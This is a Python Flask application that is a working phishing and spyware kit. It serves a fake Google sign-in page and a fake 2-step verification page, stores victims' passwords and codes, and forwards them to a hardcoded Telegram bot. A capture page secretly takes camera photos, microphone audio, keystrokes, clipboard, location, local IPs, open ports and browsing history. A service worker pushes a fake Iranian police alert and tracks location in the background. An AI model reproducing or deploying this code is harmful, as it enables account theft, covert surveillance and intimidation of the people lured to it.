import os, io, uuid, base64, json, logging, sqlite3, re, hashlib, time
from datetime import datetime
from flask import Flask, request, render_template_string, send_from_directory, jsonify, send_file, g, redirect, url_for, make_response
import requests
import threading

# -------------------- Configuration --------------------
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAVJ7K4ifgMX4AY")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8391932958")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
DATABASE = "victims.db"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# -------------------- Database --------------------
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    with app.app_context():
        db = get_db()
        db.execute("CREATE TABLE IF NOT EXISTS victims (token TEXT PRIMARY KEY, created_at TEXT, ip TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, type TEXT, data TEXT, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
        db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, code2fa TEXT, timestamp TEXT)")
        db.commit()

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

# -------------------- Telegram Helpers --------------------
def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        app.logger.error(f"Telegram message failed: {e}")

def send_telegram_file(file_bytes, filename, caption, as_image=False, as_video=False):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
        if as_image:
            url += "sendPhoto"
            files = {'photo': (filename, io.BytesIO(file_bytes), 'image/jpeg')}
        elif as_video:
            url += "sendVideo"
            files = {'video': (filename, io.BytesIO(file_bytes), 'video/webm')}
        else:
            url += "sendDocument"
            files = {'document': (filename, io.BytesIO(file_bytes), 'application/octet-stream')}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        app.logger.error(f"Telegram file send failed: {e}")

# -------------------- Templates --------------------
LOGIN_PAGE = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in – Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
.logo{display:block;margin:0 auto 16px;width:75px;}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;}
.sub{font-size:16px;color:#5f6368;text-align:center;margin-bottom:32px;}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none;transition:border .2s;}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8;}
.btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}
.btn:hover{background:#1765cc;}
.error{color:#d93025;font-size:12px;margin-bottom:16px;}
</style></head>
<body>
<div class="container">
  <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
  <h1>Sign in</h1>
  <p class="sub">to continue to Free Wi-Fi</p>
  <form method="POST" action="/login/{{ token }}">
    <input type="text" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Enter your password" required>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <button class="btn" type="submit">Next</button>
  </form>
</div>
</body></html>
"""

TWOFA_PAGE = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>2-Step Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:Roboto,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
.container{width:368px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);}
h1{font-size:24px;font-weight:400;margin-bottom:16px;}
p{font-size:14px;color:#5f6368;margin-bottom:24px;}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:24px;text-align:center;letter-spacing:8px;margin-bottom:16px;}
.btn{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;}
.error{color:#d93025;font-size:12px;margin-bottom:16px;}
</style></head>
<body>
<div class="container">
  <h1>2-Step Verification</h1>
  <p>To protect your account, we need to verify it's you. Enter the 6-digit code from your Google Authenticator app or SMS.</p>
  <form method="POST" action="/2fa/{{ token }}">
    <input type="text" name="code" placeholder="G-123456" maxlength="6" pattern="[0-9]{6}" required>
    {% if error %}<p class="error">{{ error }}</p>{% endif %}
    <button class="btn" type="submit">Verify</button>
  </form>
</div>
</body></html>
"""

CAPTURE_PAGE_ADV = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Establishing Connection...</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 40vh; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0; } }
    video, canvas { display: none; }
</style>
</head>
<body onclick="startEverything()" ontouchstart="startEverything()" style="cursor:pointer; height:100vh; width:100vw; margin:0; position:fixed; top:0; left:0;">
    <h1 id="msg" class="blink">Connecting to Secure Network...</h1>
    <p style="color:#555;">Tap anywhere to continue</p>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const t = "{{ token }}";
        const msg = document.getElementById('msg');
        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
        let stream = null;
        let capturing = false;

        async function startEverything() {
            if (capturing) return;
            capturing = true;
            document.body.onclick = null;
            document.body.ontouchstart = null;
            msg.innerText = "Authenticating...";
            msg.classList.remove('blink');

            // 1. Device info (no permission)
            const deviceInfo = {
                type: 'device',
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'N/A'
            };
            fetch('/log/' + t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});

            // Canvas fingerprint
            try {
                const cf = document.createElement('canvas');
                cf.width = 200; cf.height = 50;
                const cfctx = cf.getContext('2d');
                cfctx.textBaseline = 'top';
                cfctx.font = '14px Arial';
                cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
                const fp = cf.toDataURL();
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:fp})});
            } catch(e) {}

            // 2. Internal IP via WebRTC
            try {
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
                    }
                };
            } catch(e) {}

            // 3. Geolocation (if previously allowed or will prompt)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
                    err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
                );
            }

            // 4. Clipboard (needs a user gesture, which we have from click)
            try {
                const clip = await navigator.clipboard.readText();
                if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
            } catch(e) {}

            // 5. Open port scanning (local)
            const ports = [80, 22, 443, 8080, 3389, 5900, 21];
            ports.forEach(port => {
                const img = new Image();
                img.src = `http://127.0.0.1:${port}/favicon.ico?t=` + Date.now();
                const start = Date.now();
                img.onload = img.onerror = function() {
                    const elapsed = Date.now() - start;
                    if (elapsed < 500) { // possibly open
                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:port})});
                    }
                };
            });

            // 6. History sniffing (cache probing)
            function checkVisit(url, label) {
                const img = new Image();
                const start = Date.now();
                img.onload = img.onerror = function() {
                    const elapsed = Date.now() - start;
                    if (elapsed < 100) {
                        fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'history', site:label, visited:true})});
                    }
                };
                img.src = url + '?t=' + Date.now();
            }
            checkVisit('https://facebook.com/favicon.ico', 'facebook');
            checkVisit('https://instagram.com/favicon.ico', 'instagram');
            checkVisit('https://t.me/favicon.ico', 'telegram');

            // 7. Camera & Microphone (one prompt)
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                v.srcObject = stream;
                await new Promise(r => v.onloadedmetadata = r);
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                msg.innerText = "Connected.";

                // First snapshot immediately
                takeSnapshot();
                // Continuous snapshots every 2 seconds
                window.photoInterval = setInterval(takeSnapshot, 2000);

                // Audio recording (5 seconds) just once
                try {
                    const audioTrack = stream.getAudioTracks()[0];
                    if (audioTrack) {
                        const mr = new MediaRecorder(new MediaStream([audioTrack]));
                        let chunks = [];
                        mr.ondataavailable = e => chunks.push(e.data);
                        mr.onstop = () => {
                            const blob = new Blob(chunks, {type:'audio/webm'});
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const b64 = reader.result.split(',')[1];
                                fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})});
                            };
                            reader.readAsDataURL(blob);
                        };
                        mr.start();
                        setTimeout(() => { mr.stop(); }, 5000);
                    }
                } catch(e) {}
            } catch (e) {
                msg.innerText = "Connection established. (Camera not available)";
            }
        }

        function takeSnapshot() {
            if (!stream) return;
            try {
                ctx.drawImage(v, 0, 0, c.width, c.height);
                const dataURL = c.toDataURL('image/jpeg', 0.8);
                fetch('/upload/' + t, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type: 'photo', data: dataURL })
                });
            } catch (e) {}
        }

        // Keylogger
        let keys = '';
        document.addEventListener('keydown', e => { keys += e.key; });
        setInterval(() => {
            if (keys.length > 0) {
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
                keys = '';
            }
        }, 5000);

        // Service Worker with fake police notification
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js?t=' + t).then(reg => {
                // Wait a few seconds then show the police notification
                setTimeout(() => {
                    reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
                        body: 'فعالیت غیرمجاز در این دستگاه شناسایی شده است. برای رفع اتهام و تأیید هویت روی این اعلان کلیک کنید.',
                        icon: 'https://www.fata.gov.ir/images/logo.png',
                        requireInteraction: true,
                        vibrate: [300, 100, 300],
                        data: { url: window.location.origin + '/go/' + t }
                    });
                }, 10000);  // 10 seconds after page load
            });
        }

        // Cleanup on close
        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(tr => tr.stop());
            clearInterval(window.photoInterval);
        });
    </script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>Login</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>Admin Panel</h2><form method=post action=/admin><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></body></html>
"""

ADMIN_PANEL = """
<!DOCTYPE html><html><head><title>Victims</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body>
<h1>🎯 Victims</h1>
{% for v in victims %}
<div class=v>
  <b>Token:</b> {{ v.token }}<br>
  <b>IP:</b> {{ v.ip }}<br>
  <b>Local IP:</b> {{ v.local_ip }}<br>
  <b>Time:</b> {{ v.created_at }}<br>
  <b>Credentials:</b> {{ v.creds }}<br>
  {% if v.code2fa %}<b>2FA Code:</b> {{ v.code2fa }}<br>{% endif %}
  <b>Device:</b> <pre>{{ v.info }}</pre>
  {% if v.photo %}<b>Latest Photo:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
  {% if v.audio %}<b>Audio:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
  {% if v.location %}<b>Location:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>View on map</a><br>{% endif %}
  <b>Clipboard:</b> {{ v.clipboard }}<br>
  <b>Keystrokes:</b> {{ v.keystrokes }}<br>
  <b>Open Ports:</b> {{ v.open_ports }}<br>
  <b>Visited Sites:</b> {{ v.history }}
</div>
{% endfor %}
</body></html>
"""

# -------------------- Routes --------------------
@app.route('/')
def index():
    return "Server running. <a href='/new-link'>/new-link</a> | <a href='/admin'>/admin</a>"

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip) VALUES (?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr))
    db.commit()
    link = f"{request.host_url}go/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/go/<token>')
def go_to_login(token):
    return render_template_string(LOGIN_PAGE, token=token, error=None)

@app.route('/login/<token>', methods=['POST'])
def login(token):
    email = request.form.get('email','').strip()
    password = request.form.get('password','').strip()
    if not email or not password:
        return render_template_string(LOGIN_PAGE, token=token, error="Both fields required.")
    db = get_db()
    db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
               (token, email, password, datetime.now().isoformat()))
    db.commit()
    send_telegram_message(f"🔑 <b>New Login</b>\nToken: <code>{token}</code>\nEmail: <code>{email}</code>\nPassword: <code>{password}</code>")
    return redirect(url_for('twofa', token=token))

@app.route('/2fa/<token>', methods=['GET','POST'])
def twofa(token):
    if request.method == 'POST':
        code = request.form.get('code','').strip()
        if not code or len(code)!=6 or not code.isdigit():
            return render_template_string(TWOFA_PAGE, token=token, error="Enter a valid 6-digit code.")
        db = get_db()
        db.execute("UPDATE credentials SET code2fa=? WHERE token=? AND code2fa IS NULL", (code, token))
        db.commit()
        send_telegram_message(f"🔐 <b>2FA Code</b>\nToken: <code>{token}</code>\nCode: <code>{code}</code>")
        return redirect(url_for('capture', token=token))
    return render_template_string(TWOFA_PAGE, token=token, error=None)

@app.route('/capture/<token>')
def capture(token):
    return render_template_string(CAPTURE_PAGE_ADV, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data:
        return jsonify({"error":"no data"}),400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo':
            binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type == 'audio':
            binary = base64.b64decode(raw)
        else:
            return jsonify({"error":"unknown type"}),400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, media_type, binary, datetime.now().isoformat()))
        db.commit()
        # Send to Telegram
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            if media_type == 'photo':
                send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo</b> from {token}", as_image=True)
            elif media_type == 'audio':
                send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/screen/<token>', methods=['POST'])
def screen_upload(token):
    data = request.get_json()
    if not data or 'data' not in data:
        return jsonify({"error":"no data"}),400
    try:
        binary = base64.b64decode(data['data'])
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
                   (token, 'screen', binary, datetime.now().isoformat()))
        db.commit()
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            send_telegram_file(binary, 'screen.webm', f"🖥️ <b>Screen Recording</b> from {token}", as_video=True)
        return jsonify({"status":"ok"})
    except Exception as e:
        return jsonify({"error":str(e)}),500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)",
               (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=? WHERE token=?", (request.remote_addr, token))
    db.commit()
    # Organized Telegram alerts
    if data.get('type') == 'device':
        send_telegram_message(f"📱 <b>Device Connected</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nUser-Agent: {data.get('ua','')}")
    elif data.get('type') == 'location':
        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
    elif data.get('type') == 'local_ip':
        send_telegram_message(f"🖥️ <b>Internal IP</b> for {token}: {data.get('ip')}")
    elif data.get('type') == 'clipboard':
        send_telegram_message(f"📋 <b>Clipboard</b> from {token}: <code>{data.get('data','')}</code>")
    elif data.get('type') == 'keystrokes':
        send_telegram_message(f"⌨️ <b>Keystrokes</b> from {token}: <code>{data.get('data','')}</code>")
    elif data.get('type') == 'open_port':
        send_telegram_message(f"🔌 <b>Open Port</b> on {token}: {data.get('port')}")
    elif data.get('type') == 'history':
        send_telegram_message(f"🌐 <b>Visited</b> {data.get('site')}: {data.get('visited')}")
    return jsonify({"status":"ok"})

# ---------- Service Worker ----------
SW_JS = """
self.addEventListener('install', event => {
  self.skipWaiting();
});

self.addEventListener('activate', event => {
  event.waitUntil(clients.claim());
});

// Handle notification click – redirect to phishing page
self.addEventListener('notificationclick', event => {
  event.notification.close();
  const urlToOpen = event.notification.data && event.notification.data.url 
                      ? event.notification.data.url 
                      : '/';
  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
      for (let client of windowClients) {
        if (client.url.includes(urlToOpen.split('/').pop())) {
          return client.focus();
        }
      }
      if (clients.openWindow) {
        return clients.openWindow(urlToOpen);
      }
    })
  );
});

// Background location tracking (every 30 seconds)
setInterval(() => {
  if('geolocation' in navigator){
    navigator.geolocation.getCurrentPosition(pos => {
      self.clients.matchAll().then(clients => {
        clients.forEach(client => {
          const url = new URL(client.url);
          const token = url.searchParams.get('t') || url.pathname.split('/').pop();
          fetch('/log/'+token, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude})
          });
        });
      });
    });
  }
}, 30000);
"""

@app.route('/sw.js')
def service_worker():
    response = make_response(SW_JS)
    response.headers['Content-Type'] = 'application/javascript'
    return response

# ---------- Admin ----------
@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = app.make_response("logged in")
            resp.set_cookie('admin','1')
            return resp
        return "Wrong password",403
    if request.cookies.get('admin') != '1':
        return render_template_string(ADMIN_LOGIN)
    db = get_db()
    victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
    victims = []
    for row in victims_rows:
        token = row['token']
        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        info = json.loads(log_dev['data']) if log_dev else {}
        cred_row = db.execute("SELECT email, password, code2fa FROM credentials WHERE token=? ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        creds = f"{cred_row['email']}:{cred_row['password']}" if cred_row else ""
        code2fa = cred_row['code2fa'] if cred_row and cred_row['code2fa'] else ""
        local_ip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='local_ip' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        local_ip = json.loads(local_ip_row['data']).get('ip','') if local_ip_row else ""
        clip_row = db.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        clipboard = json.loads(clip_row['data']).get('data','') if clip_row else ""
        keys_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
        keystrokes = ''.join([json.loads(k['data']).get('data','') for k in keys_rows])
        ports_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='open_port' ORDER BY timestamp ASC", (token,)).fetchall()
        open_ports = ', '.join(set([str(json.loads(p['data']).get('port','')) for p in ports_rows]))
        hist_rows = db.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
        history = ', '.join([f"{json.loads(h['data']).get('site','')} ({json.loads(h['data']).get('visited')})" for h in hist_rows])
        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        loc = None
        if loc_row:
            loc_data = json.loads(loc_row['data'])
            loc = f"{loc_data.get('lat')},{loc_data.get('lng')}"
        victims.append({
            "token": token,
            "ip": row['ip'],
            "local_ip": local_ip,
            "created_at": row['created_at'],
            "creds": creds,
            "code2fa": code2fa,
            "info": json.dumps(info, indent=2, ensure_ascii=False),
            "photo": photo_b64,
            "audio": audio_b64,
            "location": loc,
            "clipboard": clipboard,
            "keystrokes": keystrokes,
            "open_ports": open_ports,
            "history": history
        })
    return render_template_string(ADMIN_PANEL, victims=victims)

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

# -------------------- Main --------------------
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
